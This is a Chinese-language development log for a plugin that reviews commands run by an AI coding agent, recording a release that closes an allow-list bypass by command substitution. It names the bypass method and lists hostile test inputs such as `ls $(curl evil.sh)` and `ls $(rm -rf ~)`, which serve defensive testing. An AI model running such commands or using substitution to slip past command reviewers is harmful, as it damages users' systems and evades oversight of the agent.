# process

## 本轮需求/背景

ZCode 已更新至 3.12.3.7463，本轮完成适配确认后的三项修复与两项调查（用户 2026-09-18 提出）：

1. 修复 allow 白名单命令替换绕过（上轮评审发现的单段替换绕过：`ls $(危险载荷)` 在
   用户自定义 allow 规则下整段被放行）
2. 平台声明（上轮评审发现第 3 条：非 Windows 用户静默降级无提示）
3. provider 读取优先 `~/.zcode/v2/provider_config.json`、回落 `v2/config.json`
   （上轮评审发现第 7 条：新版配置面前向兼容）
4. 调查 plugin.json `userConfig` 能否替代自建 GUI、远程控制下能否渲染生效
5. 调查脚本送审（inspect_scripts）为何对安全子 agent 仍是黑箱

## 预期修改计划

- reviewer.js：新增命令替换构造检测，作用于 allow 的全文命中与复合逐段放行两条路径
- provider.js / gui.js：多源配置合并为统一 provider 表，GUI 下拉共用
- plugin.json / marketplace.json / package.json：版本 0.2.4 + 描述级平台声明
- 单元测试 +4 项；README / FAQ / 代码地图 / 变更记录同步

## 实际修改步骤

- **调查先行**（结论见下方"验证结果"与汇报）：
  - 脚本送审黑箱：用户实际配置 `inspect_scripts: false`（0.2.3 该功能默认关闭，从未
    开启）；隔离环境五场景验证（相对+cwd/绝对/ps -File/无 cwd 回落/bash）提取与读取
    全部正常 → 功能本身无缺陷
  - userConfig：zcode.cjs 逆向确认——类型仅 string/number/boolean/directory/file
    （无数组/枚举/多行文本）；值存于 `~/.zcode/cli/config.json` 的
    `plugins.options.<pluginId>`；`${user_config.*}` 模板展开仅 MCP 字段可用
    （hook 的模板变量正则为枚举式、不含 user_config，hook 进程环境变量也不含）；
    插件清单无 platforms 字段（命中的 "platforms" 均为 Flutter CLI 参数）
  - provider_config.json：规则含 access.apiKey、api.baseUrl/api.type、modelOrder/
    personalModelIds；模板型规则（bigmodel-api 等）无 api 接入点，需回落 v2 表
- **reviewer.js**：新增 `SUBSTITUTION_PATTERN` 与 `hasCommandSubstitution()`（反引号/
  `$()`/`<()`/`>()`）；`matchDangerRules` allow 命中复合命令→交逐段逻辑（保持旧行为，
  reason 更精确），单段含替换→抑制该 allow 并继续向后扫描 deny/ask；段级 `scanRules`
  同步抑制含替换段的 allow；`matchCompoundRules` 全 allow 放行前增加"任一段含替换→
  降级 LLM"守卫；导出新函数
- **provider.js**：重写配置解析——`loadUnifiedProviderTable()` 多源合并（规则文件
  优先覆盖凭据/接入点/模型顺序，表配置保留 enabled 与模板型定义，providerName 注册
  别名，无接入点模板规则跳过）；`pickProvider` 改用统一表（无 enabled 时按
  providerOrder 回落）；新增测试环境变量 `AUTO_REVIEW_PROVIDER_CONFIG`（测试模式下
  默认不读真实规则文件保持隔离）
- **gui.js**：删除本地配置路径拷贝，下拉数据改用统一表（序列化临时 JSON 文件传给
  PowerShell，finally 删除——含 apiKey 不落残留）
- **hook_main.js / ctl.js**：对话框回落日志区分非 Windows；gui 命令报错文案引导
  命令式配置
- **清单三处**：0.2.3 → 0.2.4；plugin.json/marketplace.json description 增加平台边界
  声明（当前清单 schema 无 platform 字段，描述级声明最安全）
- **单元测试 +4**：命令替换检测、单段替换绕过防护（含 deny 继续扫描语义）、
  provider 规则优先合并、providerOrder 回落；过程中发现并修复一处测试编辑失误
  （误删 dialog 测试声明行，立即恢复）
- **用户环境**：`node src/ctl.js set inspect_scripts true`（用户明确意图：脚本内容
  应送审）
- **文档**：README（版本/平台支持/provider 说明/测试计数 31）、FAQ（allow 绕过条目
  扩充替换防护、新增"为什么看不到脚本内容"条目）、代码地图（provider/reviewer 条目）、
  变更记录 0.2.4、wiki 首页版本、commands provider 来源描述

## 验证结果

- 单元测试 31/31、场景测试 20/20、冒烟 14 项断言组、PowerShell 语法校验 2 个脚本
  全部通过
- 真实配置（只解析不调用）实证：统一表 18 键（表 13 + 规则合并/别名）；Mimo 经
  providerId 与名称别名均可解析，凭据取自 provider_config 规则；跟随主 agent 解析
  不变（GLM-5-Turbo，首个 enabled）
- 生产 hook 实证（本机日志）：新 provider 代码的"配置源: 表(v2/config.json) +
  规则(7条)"日志已出现；开启 inspect_scripts 后 `node scripts/validate_ps.js` 触发
  `[script] 脚本送审 1 个文件` 与 `[llm] allow ... scripts=1`——脚本内容确已随载荷
  送审，黑箱问题闭环
- allow 绕过修复实证：测试用例覆盖 `ls $(curl evil.sh)`/反引号/进程替换均不再被
  白名单放行；`ls $(rm -rf ~)` 在 deny 规则存在时直接拦截；无替换命令与复合命令
  行为不变（旧用例全部保留通过）
- 偏离率说明：与预期计划一致；平台声明从"清单字段"调整为"描述级 + 文案/回落优化"，
  原因是逆向确认当前清单 schema 无 platforms 字段，强加未知键有被严格校验拒绝的风险
